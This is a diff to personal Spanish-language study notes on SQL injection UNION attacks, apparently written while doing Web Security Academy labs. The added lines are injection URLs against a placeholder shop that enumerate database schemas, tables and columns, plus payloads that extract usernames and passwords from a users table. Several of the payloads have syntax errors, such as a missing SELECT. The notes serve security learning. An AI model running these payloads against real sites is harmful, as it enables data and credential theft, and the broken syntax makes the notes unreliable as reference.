@@ -61,14 +61,24 @@ http://www.tiendafalsa.com/carrito?productos?categoria=teclados'UNION SELECT NUL
 
 
 #### #### SQL injection UNION attack, retrieving data from other tables #### #### 
+http://www.tiendafalsa.com/carrito?productos?categoria=teclados'UNION group_concat(schema_name),NULL from information_schema.schemata-- -   -> listar database
+http://www.tiendafalsa.com/carrito?productos?categoria=teclados'UNION table_name,NULL from information_schema.tables-- -                    -> listar tablas
+
+http://www.tiendafalsa.com/carrito?productos?categoria=teclados'UNION table_name,NULL from information_schema.tables WHERE table.schema='DB'-- -
+
+http://www.tiendafalsa.com/carrito?productos?categoria=teclados'UNION column_name,NULL from information_schema.columns WHERE table.schema='DB' and table_name='table'-- -
+
+union select group_concat(username,':',password) from users-- - o ||':'|| para concatenar
 
 
-me quede aqui 
-https://www.youtube.com/watch?v=C-FiImhUviM
 
 
 
 
+
+#### #### Lab: SQL injection UNION attack, retrieving multiple values in a single column #### #### 
+
+https://0a5e000e04c13152803617b90013008e.web-security-academy.net/filter?category=Pets%27%20union%20select%20null,username||%27:%27||password%20from%20users--%20-
 
 
 
